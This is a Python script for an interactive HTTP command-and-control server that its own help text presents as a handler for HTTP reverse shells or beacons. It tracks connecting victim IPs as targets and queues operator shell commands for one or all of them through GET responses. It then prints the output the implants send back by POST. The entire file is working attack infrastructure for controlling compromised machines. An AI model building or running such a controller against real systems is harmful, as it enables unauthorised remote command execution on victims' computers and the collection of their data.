#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import multipart
from io import BytesIO
import threading

import prompt_toolkit
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout
import argparse

import os

parser=argparse.ArgumentParser(description='A simple, interactive HTTP handler for HTTP reverse shells or beacons')
parser.add_argument('-p',"--port", default=80, type=int, required=False, help="The port to listen on")
parser.add_argument('-a',"--address", default="0.0.0.0", required=False, help="The address to listen on")
args = parser.parse_args()

target = "*"
tasks = {target:[]}

cmd_escape=":"
sep = "\n"

class C2(BaseHTTPRequestHandler):
    def do_GET(self):
        client = self.client_address[0]
        if client not in tasks:
            tasks[client] = []
            print("New Client Connected: {}".format(client))
        tasks[client].extend(tasks["*"])
        num_cmds = len(tasks["*"])
        if num_cmds > 0:
            print("{} consumed {} tasks for *".format(client, num_cmds))
        cmd_str = sep.join(tasks[client]).encode()
        self.send_response(200)
        self.send_header('Content-Length', len(cmd_str))
        self.end_headers()
        self.wfile.write(cmd_str)
        num_cmds = len(tasks[client])
        if num_cmds > 0:
            print("{} Commands sent to {}".format(num_cmds, client))
        tasks[client] = []
        tasks["*"] = []

    def do_POST(self):
        host = self.client_address[0]
        try:
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)
            stream = BytesIO(body)
            boundary = stream.readline()
            boundary = boundary.strip(b"\r\n")[2:]
            stream.seek(0)
            parser = multipart.MultipartParser(stream, boundary)
             
            for part in parser:
                res = part.file.read().decode()
                if res:
                    print(res)
        except Exception as e:
            print(e)

    # Stop log messages from printing to the screen
    def log_message(self, format, *args):
        return

# Show currently scheduled tasks
def show_tasks():
    if target:
        print("Tasks for {}:".format(target))
        print("-"*80)
        for x in tasks[target]:
            print("{}\n{}".format(x,"-"*80))
    for t in tasks:
        if t != target:
            print("Tasks for {}:".format(t))
            print("-"*80)
            for x in tasks[t]:
                print("{}\n{}".format(x,"-"*80))

# Shows available targets
def show_targets():
    if target:
        print("Current target: {}".format(target))
    print("Available targets:")
    for t in tasks:
        print(t)

# Print a help message
def show_help():
    print("Available commands:")
    for c in [  "tasks", 
                "targets", 
                "set target X.X.X.X", 
                "set target *", 
                "exit",
                "cancel",
                "clear",
                "help"
             ]:
        print("{}{}".format(cmd_escape, c))

# Takes in raw user input.
# Returns the command that should be delivered
#  or None if no command should be delivered
def prepare(cmd):
    global target

    # If it is a special command
    if cmd.startswith(cmd_escape):
        cmd = cmd[len(cmd_escape):]
        if cmd == "tasks":
            show_tasks()
            return None
        elif cmd == "targets":
            show_targets()
            return None
        elif cmd.startswith("set target "):
            target = cmd[len("set target "):]
            if not target in tasks:
                print("Creating tasks queue for {}".format(target))
                tasks[target] = []
            return None
        elif cmd == "exit":
            print("Shutting down the server...")
            os._exit(0)
        elif cmd == "cancel":
            if target:
                print("Canceling all tasks for {}".format(target))
                tasks[target] = []
        elif cmd == "clear":
            prompt_toolkit.shortcuts.clear()
        else:
            show_help()
            return None
    else:
        if target:
            return cmd
        else:
            print("No target set. Try '{}' or '{}'".format("targets", ":set target *"))
            return None 

httpd = HTTPServer((args.address, args.port), C2)
srv_thread = threading.Thread(target=httpd.serve_forever, args=())
srv_thread.daemon = True
srv_thread.start()
print("HTTP Server running on port {}".format(args.port))
print("{}help for more help".format(cmd_escape))
session = PromptSession()
while True:
    try:
        with patch_stdout():
            cmd = session.prompt("{}>".format(target))
            cmd = prepare(cmd)
            if cmd:
                tasks[target].append(cmd)
                print("Command queued for {}".format(target))
            #print(tasks)
    except Exception as e:
        print(e)
